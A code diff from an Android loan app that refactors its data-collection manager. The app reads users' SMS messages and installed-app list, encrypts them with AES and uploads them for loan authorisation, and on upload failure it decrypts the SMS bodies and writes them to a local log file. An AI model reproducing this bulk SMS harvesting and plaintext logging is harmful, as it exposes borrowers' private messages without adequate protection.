@@ -3,7 +3,6 @@ package com.loan.icreditapp.collect
 import android.Manifest
 import android.annotation.SuppressLint
 import android.content.Context
-import android.content.pm.ApplicationInfo
 import android.database.Cursor
 import android.net.Uri
 import android.provider.CallLog
@@ -13,12 +12,12 @@ import android.util.Log
 import com.blankj.utilcode.util.*
 import com.drojian.alpha.toolslib.log.LogSaver
 import com.loan.icreditapp.BuildConfig
-import com.loan.icreditapp.api.Api
 import com.loan.icreditapp.bean.auth.AuthResponseBean
-import com.loan.icreditapp.collect.bean.AppInfoRequest
 import com.loan.icreditapp.collect.bean.CallRecordRequest
 import com.loan.icreditapp.collect.bean.ContactRequest
 import com.loan.icreditapp.collect.bean.SmsRequest
+import com.loan.icreditapp.collect.item.CollectAppInfoMgr
+import com.loan.icreditapp.collect.item.CollectSmsMgr
 import com.loan.icreditapp.global.Constant
 import com.loan.icreditapp.util.BuildRequestJsonUtils
 import com.loan.icreditapp.util.CheckResponseUtils
@@ -36,46 +35,80 @@ import java.util.regex.Pattern
 
 abstract class BaseCollectDataMgr {
 
-    fun collectAuthData(context: Context, orderId: String, observer: Observer?) {
+    companion object {
+        private val YMDHMS_FORMAT = "HH:mm, MMMM dd, yyyy"
+        fun local2UTC(timeStamp: Long): String? {
+            val sdf =
+                SimpleDateFormat(YMDHMS_FORMAT)
+            sdf.timeZone = TimeZone.getTimeZone("UTC")
+            return sdf.format(Date(timeStamp))
+        }
+
+        fun encodeData(s: String): String? {
+            if (StringUtils.isEmpty(s)) {
+                return null
+            }
+            val s1 =
+                s.replace("%".toRegex(), "").replace("\\+".toRegex(), "").replace("\"".toRegex(), "")
+                    .replace("'".toRegex(), "").replace("\\\\".toRegex(), "")
+            try {
+                var resultStr = PatternUtils.filterEmoji(s1)
+                return URLEncoder.encode(resultStr, "utf-8")
+            } catch (e: UnsupportedEncodingException) {
+                e.printStackTrace()
+            }
+            return null
+        }
+
+        fun encodeData1(s: String?): String? {
+            if (StringUtils.isEmpty(s)) {
+                return null
+            }
+            val s1 =
+                s!!.replace("%".toRegex(), "").replace("\\+".toRegex(), "").replace("\"".toRegex(), "")
+                    .replace("'".toRegex(), "").replace("\\\\".toRegex(), "")
+            try {
+                var resultStr = PatternUtils.filterEmoji(s1)
+                return resultStr
+            } catch (e: UnsupportedEncodingException) {
+                e.printStackTrace()
+            }
+            return null
+        }
+    }
+
+    fun collectAuthData(orderId: String, observer: Observer?) {
         var startMillions = System.currentTimeMillis()
-        LogSaver.logToFile(" start collect data start")
         ThreadUtils.executeByCached(object : ThreadUtils.SimpleTask<Exception?>() {
             @Throws(Throwable::class)
             override fun doInBackground(): Exception? {
                 try {
+                    val duration = (System.currentTimeMillis() - startMillions)
+                    logFile(" start collect data start allo thread = " + duration)
                     startMillions = System.currentTimeMillis()
-                    val originSms = GsonUtils.toJson(readSms(context))
-                    val tempSms = EncodeUtils.encryptAES(originSms)
-                    val smsStr = if (TextUtils.isEmpty(tempSms)) "" else tempSms
-
+                    val aesSmsStr = CollectSmsMgr.sInstance.getSmsAesStr()
                     val duration1 = (System.currentTimeMillis() - startMillions)
                     logFile(" read sms duration = " + duration1)
 
-                    val callRecordStr = ""
 //                        EncodeUtils.encryptAES(GsonUtils.toJson(readCallRecord(context)))
-//                    startMillions = System.currentTimeMillis()
+                    val callRecordStr = ""
 //                    val originContract = GsonUtils.toJson(readContract(context))
 //                    val tempContract = EncodeUtils.encryptAES(originContract)
-//                    val duration2 = (System.currentTimeMillis() - startMillions)
-//                    logFile("new read contact duration = " + duration2)
-//                    val contractStr = if (TextUtils.isEmpty(tempContract)) "" else tempContract
-                    val originContract = ""
                     val contractStr = ""
 
                     startMillions = System.currentTimeMillis()
-                    val originAppInfo = GsonUtils.toJson(readAllAppInfo())
-                    val tempAppInfo = EncodeUtils.encryptAES(originAppInfo)
-                    val appInfoStr = if (TextUtils.isEmpty(tempAppInfo)) "" else tempAppInfo
+
                     val duration3 = (System.currentTimeMillis() - startMillions)
+                    val aesAppInfoStr = CollectAppInfoMgr.sInstance.getAppInfoAesStr()
                     logFile(" read app info duration = " + duration3)
                     val locationBean = ""
 //                        EncodeUtils.encryptAES(GsonUtils.toJson(LocationMgr.getInstance().locationBean))
 
                     val jsonObject = buildRequestJsonObj(
-                        smsStr, callRecordStr, contractStr,
-                        appInfoStr, locationBean, orderId,
+                        aesSmsStr, callRecordStr, contractStr,
+                        aesAppInfoStr, locationBean, orderId,
                     )
-                    getAuthData(jsonObject, observer, originSms, originContract, originAppInfo)
+                    getAuthData(jsonObject, observer)
                 } catch (e: Exception) {
                     if (BuildConfig.DEBUG) {
                         throw e
@@ -102,12 +135,6 @@ abstract class BaseCollectDataMgr {
         locationStr: String, orderId: String
     ): JSONObject {
         val jsonObject: JSONObject = BuildRequestJsonUtils.buildRequestJson()
-        if (BuildConfig.DEBUG) {
-//            Log.i("okhttp","1 = " + com.loan.icreditapp.util.EncodeUtils.decryptAES(contractStr) + "")
-//            Log.i("okhttp","2 = " + com.loan.icreditapp.util.EncodeUtils.decryptAES(smsStr) + "")
-//            Log.i("okhttp","3 = " + com.loan.icreditapp.util.EncodeUtils.decryptAES(callRecordStr) + "")
-//            Log.i("okhttp","4 = " + com.loan.icreditapp.util.EncodeUtils.decryptAES(appListStr) + "")
-        }
         try {
             jsonObject.put("accountId", Constant.mAccountId)
             //申请订单ID
@@ -156,85 +183,9 @@ abstract class BaseCollectDataMgr {
         return jsonObject
     }
 
-    private fun readSms(context: Context): ArrayList<SmsRequest>? {
-        val list: ArrayList<SmsRequest> = ArrayList<SmsRequest>()
-        val uri = Uri.parse("content://sms/")
-        val projection =
-            arrayOf("_id", "address", "person", "body", "date", "type", "status", "read")
-        val resolver = context.contentResolver
-        val cursor = resolver.query(uri, projection, null, null, null)
-        try {
-            if (cursor != null && cursor.count > 0) {
-                while (cursor.moveToNext()) {
-                    val _id = cursor.getInt(0) //id
-                    val address = cursor.getString(1) //电话号码
-                    val body = cursor.getString(3) //短信内容
-                    val date = cursor.getLong(4)
-                    val type = cursor.getInt(5)
-                    val status = cursor.getInt(6)
-                    val read = cursor.getInt(7)
-                    val smsRequest = SmsRequest()
-                    smsRequest.addr = encodeData(address)
-                    smsRequest.body = encodeData1(processUtil(body))
-                    smsRequest.time = date
-                    smsRequest.type = type
-                    smsRequest.status = status
-                    smsRequest.read = read
-                    //                    public int read;
-//                    public int status;
-                    smsRequest.addr = address
-                    if (list.size < 3000) {
-                        list.add(smsRequest)
-                    }
-                }
-            }
-
-        } catch (e: Exception) {
-            if (BuildConfig.DEBUG) {
-                throw e
-            }
-        } finally {
-            cursor?.close()
-        }
-        return list
-    }
-
-    private fun readAllAppInfo(): ArrayList<AppInfoRequest> {
-        val list: ArrayList<AppInfoRequest> = ArrayList<AppInfoRequest>()
-        try {
-            val pm = Utils.getApp().packageManager ?: return list
-            val installedPackages = pm.getInstalledPackages(0)
-                ?: return list
-            for (i in installedPackages.indices) {
-                val packageInfo = installedPackages[i]
-                val appInfoRequest = AppInfoRequest()
-                appInfoRequest.pkgname = encodeData(packageInfo.packageName)
-                appInfoRequest.installtime = packageInfo.firstInstallTime
-                appInfoRequest.installtime_utc = Local2UTC(packageInfo.firstInstallTime)
-                val ai = packageInfo.applicationInfo
-                if (ai != null) {
-                    val isSystem = ApplicationInfo.FLAG_SYSTEM and ai.flags != 0
-                    appInfoRequest.type = if (isSystem) "0" else "1"
-                    try {
-                        appInfoRequest.appname = encodeData1(ai.loadLabel(pm).toString())
-                    } catch (e: Exception) {
-                    }
-                }
-                list.add(appInfoRequest)
-            }
-        }catch (e : Exception ){
-            if (BuildConfig.DEBUG){
-                throw e
-            }
-        }
-        return list
-    }
-
     @SuppressLint("MissingPermission")
     private fun getAuthData(
-        jsonObject: JSONObject, observer: Observer?,
-        originSms: String?, originContract: String?, originAppInfo: String?
-    ) {
+        jsonObject: JSONObject, observer: Observer?) {
         logFile(" start upload auth .")
         val startMillions = System.currentTimeMillis()
         OkGo.post<String>(getApi()).tag(getTag()).upJson(jsonObject)
@@ -257,7 +208,7 @@ abstract class BaseCollectDataMgr {
 
                         }
                         observer?.failure(errorMsg)
-                        log2File(originSms, originContract, originAppInfo, errorMsg)
+                        log2File(jsonObject, errorMsg)
                     }
                 }
 
@@ -269,24 +220,31 @@ abstract class BaseCollectDataMgr {
                     } catch (e: Exception) {
 
                     }
-                    logFile("start upload auth failure =  " + (System.currentTimeMillis() - startMillions))
                     observer?.failure(errorMsg)
+                    logFile("start upload auth failure =  " + (System.currentTimeMillis() - startMillions))
                 }
             })
     }
 
     private fun log2File(
-        originSms: String?,
-        originContract: String?,
-        originAppInfo: String?,
+        jsonObject: JSONObject,
         errorMsg: String?
     ) {
+        var originSms : String? = ""
+        var originAppInfo : String? = ""
+
+        val aesSmsStr = jsonObject.optString("sms")
+        if (!TextUtils.isEmpty(aesSmsStr)){
+            originSms = EncodeUtils.decryptAES(aesSmsStr)
+        }
+        val aesAppListStr = jsonObject.optString("appList")
+        if (!TextUtils.isEmpty(aesAppListStr)){
+            originAppInfo = EncodeUtils.decryptAES(aesAppListStr)
+        }
+
         val sb = StringBuffer()
         if (!TextUtils.isEmpty(originSms)) {
             sb.append("  sms: ").append(originSms)
-        }
-        if (!TextUtils.isEmpty(originContract)) {
-            sb.append("  contract: ").append(originContract)
         }
         if (!TextUtils.isEmpty(originAppInfo)) {
             sb.append("  appinfo: ").append(originAppInfo)
@@ -300,7 +258,7 @@ abstract class BaseCollectDataMgr {
     }
 
     fun logFile(str : String){
-        if (!Constant.IS_AAB_BUILD) {
+        if (BuildConfig.DEBUG) {
             Log.e("Test", str)
         }
         LogSaver.logToFile(getLogTag() + " " + str)
@@ -310,71 +268,14 @@ abstract class BaseCollectDataMgr {
 
     }
 
-    fun encodeData(s: String): String? {
-        if (StringUtils.isEmpty(s)) {
-            return null
-        }
-        val s1 =
-            s.replace("%".toRegex(), "").replace("\\+".toRegex(), "").replace("\"".toRegex(), "")
-                .replace("'".toRegex(), "").replace("\\\\".toRegex(), "")
-        try {
-            var resultStr = PatternUtils.filterEmoji(s1)
-            return URLEncoder.encode(resultStr, "utf-8")
-        } catch (e: UnsupportedEncodingException) {
-            e.printStackTrace()
-        }
-        return null
-    }
-
-    fun encodeData1(s: String?): String? {
-        if (StringUtils.isEmpty(s)) {
-            return null
-        }
-        val s1 =
-            s!!.replace("%".toRegex(), "").replace("\\+".toRegex(), "").replace("\"".toRegex(), "")
-                .replace("'".toRegex(), "").replace("\\\\".toRegex(), "")
-        try {
-            var resultStr = PatternUtils.filterEmoji(s1)
-            return resultStr
-        } catch (e: UnsupportedEncodingException) {
-            e.printStackTrace()
-        }
-        return null
-    }
-
-    fun processUtil(str: String?): String? {
-        var str = str
-        if (StringUtils.isEmpty(str)) {
-            return null
-        }
-        val regex = "(.*)\"(.*)\"(.*)"
-        val pattern = Pattern.compile(regex)
-        var matcher = pattern.matcher(str)
-        while (matcher.find()) {
-            str = matcher.group(1) + "“" + matcher.group(2) + "”" + matcher.group(3)
-            matcher = pattern.matcher(str)
-        }
-        return str
-    }
-
     fun onDestroy(){
         OkGo.getInstance().cancelTag(getTag())
-    }
-
-    private val YMDHMS_FORMAT = "HH:mm, MMMM dd, yyyy"
-    private fun Local2UTC(timeStamp: Long): String? {
-        val sdf =
-            SimpleDateFormat(YMDHMS_FORMAT)
-        sdf.timeZone = TimeZone.getTimeZone("UTC")
-        return sdf.format(Date(timeStamp))
     }
 
     interface Observer {
         fun success(response: Response<String>?)
         fun failure(response: String?)
     }
-
-
 
     private fun readCallRecord(context: Context): ArrayList<CallRecordRequest> {
         val callRecordList = ArrayList<CallRecordRequest>()
